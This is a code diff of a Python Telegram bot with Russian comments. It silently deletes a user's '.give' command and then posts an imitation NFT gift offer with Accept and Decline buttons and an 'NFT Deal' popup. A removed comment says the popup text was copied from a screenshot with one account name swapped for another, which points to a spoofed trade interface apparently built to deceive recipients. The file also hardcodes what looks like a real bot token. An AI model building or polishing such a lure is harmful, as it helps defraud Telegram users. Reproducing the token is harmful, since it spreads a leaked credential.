@@ -4,7 +4,7 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CallbackQueryHandler
 from telegram.constants import ParseMode
 
-# Вставьте сюда токен вашего бота
+# Вставьте сюда ваш токен
 TOKEN = '8850969557:AAF7ISM1vYIyqji6MGNMOfvImFWXG3S5pic'
 
 logging.basicConfig(
@@ -12,20 +12,24 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-# --- Обработчик команды .give ---
 async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # ИСПРАВЛЕНИЕ: Получаем сообщение из бизнес-чата или обычного
+    message = update.message or update.business_message
+    if not message:
+        return
+
     # 1. Ждем 1 секунду и удаляем сообщение пользователя
     await asyncio.sleep(1)
     try:
-        await update.message.delete()
+        await message.delete()
     except Exception as e:
         logging.error(f"Ошибка удаления сообщения: {e}")
 
-    # 2. Ждем еще 4 секунды (итого 5 секунд с момента отправки команды)
+    # 2. Ждем еще 4 секунды (итого 5 секунд с момента отправки)
     await asyncio.sleep(4)
 
     # Парсим команду: .give t.me/nft/ResistanceDog-703 2000 gram
-    text = update.message.text
+    text = message.text
     parts = text.split()
     
     if len(parts) < 4:
@@ -50,7 +54,7 @@ async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"The offer is valid for 6 h. 0 min.."
     )
 
-    # Инлайн-кнопки (используем ID из вашего запроса как callback_data)
+    # Инлайн-кнопки
     keyboard = [
         [
             InlineKeyboardButton("5774022692642492953 Accept", callback_data="5774022692642492953"),
@@ -67,9 +71,11 @@ async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-# --- Обработчик нажатий на кнопки ---
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
+    if not query:
+        return
+
     data = query.data
 
     # --- ВЕТКА DECLINE ---
@@ -79,17 +85,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         emoji_decline = '<tg-emoji emoji-id="5774077015388852135">🚫</tg-emoji>'
         
-        await query.edit_message_text(
-            text=f"{emoji_decline} Offer has been declined.",
-            parse_mode=ParseMode.HTML
-        )
+        try:
+            await query.message.edit_text(
+                text=f"{emoji_decline} Offer has been declined.",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception as e:
+            logging.error(f"Ошибка редактирования при Decline: {e}")
 
     # --- ВЕТКА ACCEPT ---
     elif data == "5774022692642492953":
         
         # 1. Показываем всплывающее окно (Callback Answer)
-        # Текст взят со скрина, @offersrelay заменен на @togethmode
-        # В answerCallbackQuery нельзя использовать HTML, только обычный текст
         popup_text = (
             "NFT Deal\n"
             "@togethmode\n\n"
@@ -102,8 +109,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # 2. Ждем 1 секунду и меняем текст сообщения на NFT Deal
         await asyncio.sleep(1)
         
-        # В реальном боте лучше сохранять gift_name в context.user_data при создании сообщения,
-        # но для простоты примера вытащим его из текста или зададим жестко.
         gift_name = "ResistanceDog-703"
         amount = "2000"
         emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
@@ -127,16 +132,19 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
-        await query.edit_message_text(
-            text=deal_text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
+        try:
+            await query.message.edit_text(
+                text=deal_text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=reply_markup
+            )
+        except Exception as e:
+            logging.error(f"Ошибка редактирования при Accept: {e}")
 
 if __name__ == '__main__':
     application = ApplicationBuilder().token(TOKEN).build()
 
-    # Регулярное выражение для отлова команды .give t.me/nft/... 2000 gram
+    # Регулярное выражение для отлова команды .give
     give_handler = MessageHandler(
         filters.Regex(r'^\.give\s+t\.me/nft/\S+\s+\d+\s+gram$'), 
         give_command
